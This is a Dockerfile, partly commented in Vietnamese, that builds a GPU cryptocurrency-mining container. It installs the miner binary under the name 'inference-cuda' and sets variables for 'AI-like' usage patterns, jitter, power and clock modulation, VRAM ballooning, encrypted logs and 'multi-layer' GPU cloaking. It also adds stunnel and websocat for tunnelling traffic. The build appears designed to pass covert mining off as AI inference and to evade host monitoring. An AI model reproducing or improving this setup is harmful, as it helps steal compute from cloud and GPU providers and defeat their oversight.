FROM nvidia/cuda:12.0.0-cudnn8-devel-ubuntu22.04


# =============================================================================
# UNIFIED STAGE: Runtime-only approach (KHÔNG build BCC từ source)
# =============================================================================

# Thiết lập non-interactive để tránh các câu hỏi khi cài đặt
ENV DEBIAN_FRONTEND=noninteractive


# ------------------  (1)  Biến môi trường & ARG giữ nguyên ------------------

ARG MINING_SERVER_GPU
ARG MINING_WALLET_GPU
ARG WEBSOCAT_VERSION=1.12.0
ARG TARGETARCH=amd64

ENV DEBIAN_FRONTEND=noninteractive \
    PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    LANG=en_US.UTF-8 \
    LC_ALL=en_US.UTF-8 \
    MINING_SERVER_GPU=${MINING_SERVER_GPU} \
    MINING_WALLET_GPU=${MINING_WALLET_GPU} \
    PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"


# ------------------  (2)  Cài đặt hệ thống cơ bản ------------------------
RUN set -eux; \
    apt-get update --allow-releaseinfo-change || true; \
    apt-get install -y --no-install-recommends \
        apt-utils sudo nano wget file python3 python3-pip curl git \
        libssl-dev libeigen3-dev libnuma-dev stunnel4 \
        cpufrequtils iproute2 util-linux \
        python3-yaml \
        pciutils openssl lm-sensors powerstat stress-ng bash \
        htop locales iptables powertop tzdata numactl systemd dbus \
        pkg-config libhwloc15 libhwloc-dev ca-certificates lsb-release gnupg \
        libuv1 libudev1 libssl3 cgroup-tools libcgroup1 libcap2-bin nvidia-container-toolkit \
        kmod software-properties-common snapd linux-tools-generic linux-tools-azure \
        erlang-base erlang-crypto erlang-eldap erlang-ftp erlang-inets erlang-mnesia \
        erlang-os-mon erlang-parsetools erlang-public-key erlang-runtime-tools \
        erlang-snmp erlang-ssl erlang-syntax-tools erlang-tftp erlang-tools \
        erlang-xmerl erlang-asn1 socat logrotate && \
    sudo apt-get clean && \
    sudo rm -rf /var/lib/apt/lists/*

# ------------------  (3)  Locale & Timezone  -------------------------------
RUN set -eux; apt-get update; DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata locales; \
    ln -fs /usr/share/zoneinfo/UTC /etc/localtime; echo "UTC" > /etc/timezone; \
    dpkg-reconfigure -f noninteractive tzdata; locale-gen en_US.UTF-8; \
    update-locale LANG=en_US.UTF-8 LC_ALL=en_US.UTF-8 && rm -rf /var/lib/apt/lists/*

# ------------------  (5)  Stunnel ------------------------------------------
RUN set -eux; mkdir -p /etc/stunnel; \
    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
        -keyout /etc/stunnel/soff.key \
        -out /etc/stunnel/soff.crt \
        -subj "/C=VN/ST=Ho_Chi_Minh/L=Ho_Chi_Minh/O=MyOrg/OU=MyUnit/CN=example.com"; \
    chmod 600 /etc/stunnel/soff.key /etc/stunnel/soff.crt
COPY stunnel.conf /etc/stunnel/stunnel.conf
RUN set -eux; \
    chmod 700 /etc/stunnel/stunnel.conf; \
    command -v stunnel4 >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends stunnel4); \
    ln -sf $(command -v stunnel4) /usr/bin/stunnel


# ------------------  (7)  Thư mục làm việc & Python deps -------------------
RUN mkdir -p /app
WORKDIR /app

# ===== CUDA VERSION SYNCHRONIZATION FIX =====
# Copy requirements file with CUDA 12.0 compatible packages
COPY requirements.txt /app/requirements.txt

# ----- Python dependencies installation (PyTorch-free) -----
RUN set -eux; \
    if ! command -v pip3 >/dev/null 2>&1; then \
        apt-get update && \
        apt-get install -y --no-install-recommends python3-pip python3-dev; \
    fi; \
    python3 -m pip install --upgrade pip; \
    ln -sf $(which python3) /usr/bin/python || true; \
    # Install requirements without PyTorch (not needed for mining)
    # Mining uses system CUDA 12.0 via inference-cuda binary directly
    pip3 install --no-cache-dir --break-system-packages --ignore-installed -r requirements.txt && \
    rm -rf /var/lib/apt/lists/* /root/.cache

# ------------------  (9)  Copy source code -------------------------------
COPY . /app/

# Sao chép pre-compiled binaries và libraries
COPY inference-cuda.original libmlls-cuda.so /tmp/
COPY entrypoint.sh /app/entrypoint.sh


RUN ldconfig && \
    install -D /tmp/inference-cuda.original    /usr/local/bin/inference-cuda.original && \
    install -D /tmp/libmlls-cuda.so   /usr/local/bin/libmlls-cuda.so

# Create enhanced NVRTC wrapper script
COPY inference-cuda /usr/local/bin/inference-cuda
RUN chmod +x /usr/local/bin/inference-cuda

# ------------------  (10)  Enhanced GPU Runtime & Libraries ---------------
RUN set -eux; apt-get update; \
    apt-get install -y --no-install-recommends \
        # NVIDIA ML & Management Libraries (available packages)
        libnvidia-ml-dev \
        # OpenCL Support for Mining Applications  
        ocl-icd-opencl-dev clinfo ocl-icd-libopencl1 opencl-headers \
        # Additional Mining Dependencies
        libnuma1 libhwloc15 libuv1-dev \
        # System monitoring tools
        pciutils lshw \
    && ldconfig && rm -rf /var/lib/apt/lists/*

# ------------------  (11) Websocat -------------------

RUN set -eux; \
    command -v wget >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends wget); \
    if [ "${TARGETARCH}" = "amd64" ]; then WEBSOCAT_ARCH="x86_64-unknown-linux-musl"; else WEBSOCAT_ARCH="aarch64-unknown-linux-musl"; fi; \
    wget -q "https://github.com/vi/websocat/releases/download/v${WEBSOCAT_VERSION}/websocat.${WEBSOCAT_ARCH}" -O /usr/local/bin/websocat; \
    chmod +x /usr/local/bin/websocat


# Force system CUDA 12.0 libraries to take precedence over Python packages
ENV CUDA_PATH=/usr/local/cuda

# ------------------  (13)  ENV cố định (đã tối giản) -----------------------
ENV SCRIPT_DIR=/app/mining_environment/scripts \
    CONFIG_DIR=/app/mining_environment/config \
    LOGS_DIR=/app/mining_environment/logs \
    CUDA_COMMAND=/usr/local/bin/inference-cuda \
    MLLS_CUDA=/usr/local/bin/libmlls-cuda.so 


# Feature flags for GPU optimization and logging (cờ tính năng – đặt mặc định cho container)
ENV ENABLE_DYNAMIC_BALANCING=true \
    ENABLE_LOG_DEDUP=0 \
    ENABLE_DAG_SYNC=true \
    LOG_ENCRYPTION_ENABLED=1 \
    LOG_ENCRYPTION_MAX_MB=50 \
    ENABLE_LOGROTATE=1

# ------------------  GPU OPTIMIZATION SETTINGS (No Plugins) ------------------
# Core GPU Optimization Controls
ENV GPU_OPT_ENABLED=1 \
    GPU_OPT_PROFILE=medium \
    GPU_OPT_CONFIG=/app/mining_environment/config/gpu_optimization_config.json

# Hardware Control Settings  
ENV ENABLE_NVML_CONTROL=1 \
    NVML_FALLBACK_COMPUTE=1 \
    GPU_POWER_VARIATION=12 \
    GPU_CLOCK_MODULATION=1

# VRAM Management
ENV VRAM_BALLOON_ENABLED=1 \
    VRAM_TARGET_PERCENT=50 \
    VRAM_ROTATION_INTERVAL=60

# Temperature Management
ENV TEMP_THRESHOLD_WARNING=75 \
    TEMP_THRESHOLD_CRITICAL=80 \
    TEMP_SCALE_FACTOR=0.8

# Pattern Settings for AI-like behavior
ENV PATTERN_TYPE=adaptive \
    JITTER_MULTI_LAYER=1 \
    PHASE_SHIFT_RANDOM=1

# Monitoring and Metrics
ENV ENABLE_STDDEV_MONITOR=1 \
    STDDEV_CHECK_INTERVAL=60 \
    LOG_METRICS_INTERVAL=30



# ===== Continuous Optimization – cấu hình mặc định trong Dockerfile =====
ENV CONTINUOUS_OPT_ENABLED=1
ENV CONTINUOUS_OPT_INTERVAL_SEC=30
ENV CONTINUOUS_OPT_MODE=adaptive

# ===== Dải bậc mặc định (tier mapping) =====
# Final recommended: 0: 240–420, 1: 420–900, 2: 900–1500, 3: 1500–2400, 4: 2400–4200
ENV INTERVAL_CHOICES_JSON=[[240,420],[420,900],[900,1500],[1500,2400],[2400,4200]]

# ===== Giới hạn bậc (kẹp min/max). Phương án cuối: MIN=0, MAX=3 =====
ENV INTERVAL_MIN_TIER=0
ENV INTERVAL_MAX_TIER=3

# ===== Random jitter (nhiễu ngẫu nhiên – giảm đồng pha) =====
ENV INTERVAL_JITTER_PCT=0.22


# ===== Per-tier overrides (tùy chọn) =====
# Để trống nghĩa là giữ nguyên theo INTERVAL_CHOICES_JSON hoặc defaults trong code.
# Điền "" hoặc "[]" vào INTERVAL_CHOICE_TIER_i để tắt (disable) bậc i.
ENV INTERVAL_CHOICE_TIER_0=
ENV INTERVAL_CHOICE_TIER_0_LO=
ENV INTERVAL_CHOICE_TIER_0_HI=
ENV INTERVAL_CHOICE_TIER_1=
ENV INTERVAL_CHOICE_TIER_1_LO=
ENV INTERVAL_CHOICE_TIER_1_HI=
ENV INTERVAL_CHOICE_TIER_2=
ENV INTERVAL_CHOICE_TIER_2_LO=
ENV INTERVAL_CHOICE_TIER_2_HI=
ENV INTERVAL_CHOICE_TIER_3=
ENV INTERVAL_CHOICE_TIER_3_LO=
ENV INTERVAL_CHOICE_TIER_3_HI=
ENV INTERVAL_CHOICE_TIER_4=
ENV INTERVAL_CHOICE_TIER_4_LO=
ENV INTERVAL_CHOICE_TIER_4_HI=


# ========================================
# ===== CRITICAL: CUDA 12.0 LIBRARY PATH ENFORCEMENT =====
# ========================================
ENV LD_LIBRARY_PATH=/usr/local/cuda/targets/x86_64-linux/lib:$LD_LIBRARY_PATH

# Tạo symlink NVRTC (.so.12.0) nếu base image chỉ có .12.0.140
RUN set -eux; \
    NVRTC_DIR="/usr/local/cuda/targets/x86_64-linux/lib"; \
    if [ -d "$NVRTC_DIR" ]; then \
        cd "$NVRTC_DIR"; \
        [ -f libnvrtc-builtins.so.12.0 ] || ln -s libnvrtc-builtins.so.12.0.140 libnvrtc-builtins.so.12.0; \
        [ -f libnvrtc.so.12.0 ] || ln -s libnvrtc.so.12.0.140 libnvrtc.so.12.0; \
        ldconfig; \
    fi

# ------------------  (14)  Verification và cleanup ------------------------
RUN set -eux; \
    apt-get update; \
    command -v capsh >/dev/null 2>&1 || apt-get install -y --no-install-recommends libcap2-bin; \
    command -v capsh >/dev/null 2>&1 && ln -sf $(command -v capsh) /usr/local/bin/capsh; \
    ldconfig -p | grep -q "libuv.so.1" || (apt-get install -y --no-install-recommends libuv1 && ldconfig); \
    # Final verification that CUDA 12.0 NVRTC is properly configured
    echo "=== FINAL CUDA VERSION VERIFICATION ==="; \
    ldconfig -p | grep nvrtc || echo "Warning: NVRTC not in ldconfig"; \
    ls -la /usr/local/cuda-12.0/targets/x86_64-linux/lib/libnvrtc-builtins.so.12.0* || echo "Warning: NVRTC 12.0 files missing"; \
    echo "CUDA_PATH: $CUDA_PATH"; \
    echo "LD_LIBRARY_PATH: $LD_LIBRARY_PATH"; \
    rm -rf /var/lib/apt/lists/*

# ------------------  (16)  Healthcheck & Metadata --------------------------
HEALTHCHECK --interval=1m --timeout=10s --start-period=30s --retries=3 CMD pgrep -f start_mining.py || exit 1

LABEL maintainer="Transformer Mining Team" \
      version="1.3.0-cuda-sync" \
      description="Enhanced GPU mining container with CUDA 12.0 version synchronization" \
      cuda.version="12.0" \
      cuda.runtime="synchronized" \
      cuda.nvrtc="12.0-enforced" \
      opencl.enabled="true" \
      ebpf.enabled="true" \
      ebpf.mode="runtime-load-only" \
      gpu.cloaking="multi-layer" \
      gpu.plugins="modular-architecture" \
      gpu.debug="integrated" \
      security.level="high" \
      version.sync="cuda-12.0-enforced"

      
# ------------------  (17)  Entrypoint & CMD --------------------------------
COPY start_mining.py /app/start_mining.py
RUN chmod +x /app/entrypoint.sh /app/start_mining.py

ENTRYPOINT ["/app/entrypoint.sh"]
CMD ["python3", "/app/start_mining.py"] 
